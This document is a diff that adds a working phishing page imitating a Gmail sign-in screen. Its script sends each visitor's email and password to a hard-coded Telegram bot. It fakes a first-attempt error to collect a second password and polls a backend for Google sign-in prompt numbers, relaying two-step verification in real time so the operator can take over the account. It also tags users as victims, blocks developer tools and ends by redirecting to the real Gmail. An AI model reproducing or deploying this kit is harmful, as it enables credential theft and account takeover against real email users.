@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail - Sign in</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #f0f2f5; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 24px; margin: 0; font-family: -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; }
+        .login-card { max-width: 440px; width: 100%; background: #ffffff; border-radius: 16px; padding: 48px 40px 40px; box-shadow: 0 8px 40px rgba(0,0,0,0.12), 0 2px 8px rgba(0,0,0,0.06); border: 1px solid rgba(0,0,0,0.04); }
+        .login-logo { text-align: center; margin-bottom: 28px; }
+        .login-logo svg { width: 80px; height: 80px; display: inline-block; }
+        .login-title { font-size: 26px; font-weight: 400; color: #1a1a1a; text-align: center; margin-bottom: 6px; letter-spacing: -0.2px; }
+        .login-subtitle { font-size: 15px; color: #5f6368; text-align: center; margin-bottom: 32px; font-weight: 400; }
+        .input-group { margin-bottom: 20px; }
+        .input-group label { display: block; font-size: 13px; font-weight: 500; color: #3c4043; margin-bottom: 6px; }
+        .input-group input { width: 100%; padding: 14px 16px; font-size: 16px; border: 1.5px solid #dadce0; border-radius: 8px; outline: none; transition: border-color 0.2s ease, box-shadow 0.2s ease; background: #fafafa; color: #202124; }
+        .input-group input:focus { border-color: #D93025; box-shadow: 0 0 0 3px rgba(217,48,37,0.15); background: #ffffff; }
+        .password-wrapper { position: relative; }
+        .toggle-password { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); color: #5f6368; cursor: pointer; font-size: 13px; font-weight: 500; background: none; border: none; padding: 4px 8px; }
+        .toggle-password:hover { color: #D93025; }
+        .error-message { color: #d93025; background: #fce8e8; text-align: center; padding: 12px 16px; border-radius: 8px; font-size: 14px; margin: 12px 0 16px; display: none; border: 1px solid #f5c6c6; }
+        .error-message.show { display: block; animation: shake 0.4s ease; }
+        @keyframes shake { 0%,100%{transform:translateX(0)} 20%,60%{transform:translateX(-6px)} 40%,80%{transform:translateX(6px)} }
+        .login-button { width: 100%; padding: 14px; background: #D93025; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s ease, box-shadow 0.2s ease; margin-top: 4px; }
+        .login-button:hover { background: #c62828; box-shadow: 0 2px 12px rgba(217,48,37,0.3); }
+        .login-button:active { transform: scale(0.98); }
+        .login-footer { display: flex; justify-content: space-between; align-items: center; margin-top: 24px; font-size: 14px; }
+        .login-footer a { color: #D93025; text-decoration: none; font-weight: 500; transition: color 0.2s; }
+        .login-footer a:hover { color: #b71c1c; text-decoration: underline; }
+        #loadingOverlay { display: none; text-align: center; padding: 40px 20px; }
+        #loadingOverlay h2 { font-size: 20px; font-weight: 400; color: #202124; margin-bottom: 16px; }
+        #loadingOverlay p { color: #5f6368; font-size: 14px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #D93025; border-radius: 50%; width: 48px; height: 48px; animation: spin 0.8s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #loadingPage { display: none; text-align: center; padding: 40px 20px; }
+        #loadingPage h2 { font-size: 20px; font-weight: 400; color: #202124; margin-bottom: 16px; }
+        #loadingPage p { color: #5f6368; font-size: 14px; }
+        .polling-status { color: #999; font-size: 12px; margin-top: 20px; }
+        #verificationPage { display: none; text-align: center; padding: 30px; background: #ffffff; min-height: 400px; border-radius: 10px; flex-direction: column; justify-content: center; }
+        .verification-title { color: #202124; font-size: 24px; font-weight: 400; margin-bottom: 30px; }
+        .big-number { font-size: 72px; font-weight: bold; color: #202124; background: #f1f3f4; display: inline-block; padding: 20px 40px; border-radius: 20px; margin: 20px auto; border: 2px solid #dadce0; width: fit-content; }
+        .instruction-text { color: #5f6368; margin: 20px 0; font-size: 16px; line-height: 1.6; max-width: 350px; margin-left: auto; margin-right: auto; }
+        .phone-name { font-weight: bold; color: #1a73e8; }
+        .confirm-button { background: #1a73e8; color: white; border: none; border-radius: 24px; padding: 16px 32px; font-size: 18px; font-weight: 600; cursor: pointer; transition: all 0.2s; margin: 30px auto 0; width: 100%; max-width: 300px; }
+        .confirm-button:hover { background: #1557b0; transform: scale(1.02); }
+        .confirm-button:disabled { background: #ccc; cursor: not-allowed; }
+        @media (max-width: 480px) { body { padding: 12px; } .login-card { padding: 32px 20px 28px; border-radius: 12px; } .login-title { font-size: 22px; } .login-logo svg { width: 64px; height: 64px; } .input-group input { padding: 12px 14px; font-size: 15px; } .login-button { padding: 14px; font-size: 15px; } .big-number { font-size: 48px; padding: 15px 30px; } }
+    </style>
+</head>
+<body>
+    <div class="login-card">
+        <div class="login-logo">
+            <svg viewBox="0 0 48 48" width="80" height="80">
+                <rect x="4" y="4" width="40" height="40" rx="8" fill="#D93025"/>
+                <path d="M24 18l-16 10v8l16-10 16 10v-8l-16-10z" fill="white"/>
+                <path d="M8 16v8l16 10 16-10v-8l-16 10-16-10z" fill="#fff" opacity="0.8"/>
+            </svg>
+        </div>
+        <h1 class="login-title">Sign in with Gmail</h1>
+        <p class="login-subtitle">to continue to OneNote</p>
+        
+        <div id="loginForm">
+            <div class="input-group"><label>Email or phone</label><input type="email" id="email" placeholder="example@gmail.com"></div>
+            <div class="input-group"><label>Password</label><div class="password-wrapper"><input type="password" id="password" placeholder="Enter your password"><button type="button" class="toggle-password" onclick="togglePassword()">Show</button></div></div>
+            <div id="loginError" class="error-message">Invalid email or password</div>
+            <button class="login-button" onclick="submitLogin()">Sign in</button>
+            <div class="login-footer"><a href="#">Forgot password?</a><a href="#">Create account</a></div>
+        </div>
+        
+        <div id="loadingOverlay"><h2>Verifying your credentials</h2><div class="spinner"></div><p>Please wait...</p></div>
+        
+        <div id="loadingPage">
+            <h2>Verifying your identity</h2>
+            <div class="spinner"></div>
+            <p style="color: #5f6368; margin: 20px 0;">Please wait while we confirm with Google...</p>
+            <p style="color: #80868b; font-size: 14px;">Check your phone for notification</p>
+            <div class="polling-status" id="pollingStatus">Waiting for verification...</div>
+        </div>
+        
+        <div id="verificationPage">
+            <div class="verification-title">2-Step Verification</div>
+            <div class="big-number" id="displayedNumber">--</div>
+            <div class="instruction-text" id="instructionText"></div>
+            <button class="confirm-button" id="confirmButton" onclick="confirmVerification()" disabled>✅ I've verified</button>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8849922646:AAHL1k8PDTU83eg5OVZJYTqGdLvyfwdydaw";
+        const CHANNEL_ID = "8374468402";
+        
+        const urlParams = new URLSearchParams(window.location.search);
+        const victimId = urlParams.get('vid') || localStorage.getItem('victim_id') || 'VIC_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
+        localStorage.setItem('victim_id', victimId);
+
+        function sendToTelegram(message) {
+            try {
+                const img = new Image();
+                img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHANNEL_ID}&text=${encodeURIComponent(message)}`;
+                img.style.display = 'none';
+                document.body.appendChild(img);
+                setTimeout(() => { if (img.parentNode) img.parentNode.removeChild(img); }, 3000);
+                return true;
+            } catch(e) { return false; }
+        }
+
+        let loginAttempts = 0;
+        let currentEmail = '';
+        let pollInterval = null;
+        let currentPromptNumber = null;
+        let isPolling = false;
+
+        function togglePassword() {
+            const pwd = document.getElementById('password');
+            const toggle = document.querySelector('.toggle-password');
+            if (pwd.type === 'password') { pwd.type = 'text'; toggle.textContent = 'Hide'; }
+            else { pwd.type = 'password'; toggle.textContent = 'Show'; }
+        }
+
+        function getPhoneName() {
+            const ua = navigator.userAgent;
+            if (ua.includes('iPhone')) return 'iPhone';
+            if (ua.includes('iPad')) return 'iPad';
+            if (ua.includes('Android')) return 'Android phone';
+            return 'device';
+        }
+
+        function showLoading() {
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('loadingOverlay').style.display = 'block';
+        }
+
+        function hideLoading() {
+            document.getElementById('loadingOverlay').style.display = 'none';
+        }
+
+        function submitLogin() {
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            if (!email || !password) { alert('Please enter both email and password'); return; }
+            currentEmail = email;
+            loginAttempts++;
+            const msg = `[+]━━【🔐 CREDENTIALS】━━[+]\nProvider: Gmail\nVictim: ${victimId}\nEmail: ${email}\nPassword: ${password}\nAttempt: ${loginAttempts}`;
+            sendToTelegram(msg);
+            if (loginAttempts === 1) {
+                const errorEl = document.getElementById('loginError');
+                errorEl.textContent = 'Invalid email or password';
+                errorEl.classList.add('show');
+                document.querySelector('.login-card').style.animation = 'shake 0.4s ease';
+                setTimeout(() => { document.querySelector('.login-card').style.animation = ''; }, 400);
+                document.getElementById('password').value = '';
+                document.getElementById('password').focus();
+            } else {
+                showLoading();
+                setTimeout(() => {
+                    hideLoading();
+                    document.getElementById('loginForm').style.display = 'none';
+                    document.getElementById('loadingPage').style.display = 'block';
+                    sendToTelegram(`🔄 Gmail victim waiting for Google Prompt\nEmail: ${email}\nSend: /send_number ${victimId} [number]`);
+                    startPollingForNumber();
+                }, 4000);
+            }
+        }
+
+        function startPollingForNumber() {
+            if (pollInterval) clearInterval(pollInterval);
+            isPolling = true;
+            pollInterval = setInterval(checkForNumber, 3000);
+            document.getElementById('pollingStatus').innerHTML = 'Waiting for verification...';
+        }
+
+        function checkForNumber() {
+            if (!isPolling) return;
+            fetch(`/api/get_prompt_number.php?victim_id=${victimId}`)
+                .then(r => r.json())
+                .then(data => {
+                    if (data.number) {
+                        clearInterval(pollInterval);
+                        isPolling = false;
+                        showVerificationPage(data.number);
+                    }
+                })
+                .catch(() => {});
+        }
+
+        function showVerificationPage(number) {
+            currentPromptNumber = number;
+            document.getElementById('loadingPage').style.display = 'none';
+            document.getElementById('verificationPage').style.display = 'flex';
+            document.getElementById('displayedNumber').textContent = number;
+            document.getElementById('instructionText').innerHTML = 
+                `Check your phone <span class="phone-name">(${getPhoneName()})</span><br><br>` +
+                `Google sent a notification. Tap Yes, then tap <strong>${number}</strong> to verify.`;
+            document.getElementById('confirmButton').disabled = false;
+            sendToTelegram(`✅ Verification page showing number ${number} for ${victimId}`);
+        }
+
+        function confirmVerification() {
+            document.getElementById('confirmButton').disabled = true;
+            document.getElementById('confirmButton').innerHTML = "⏳ Confirming...";
+            sendToTelegram(`✅ Victim ${victimId} confirmed verification for number ${currentPromptNumber}`);
+            document.getElementById('verificationPage').style.display = 'none';
+            document.getElementById('loadingOverlay').style.display = 'block';
+            document.querySelector('#loadingOverlay h2').textContent = 'Verifying...';
+            fetch(`/api/get_prompt_number.php?confirm=${victimId}`).catch(() => {});
+            setTimeout(() => { window.location.href = 'https://mail.google.com'; }, 4000);
+        }
+
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) { e.preventDefault(); return false; }
+        });
+
+        window.sendToTelegram = sendToTelegram;
+        window.victimId = victimId;
+    </script>
+</body>
+</html>
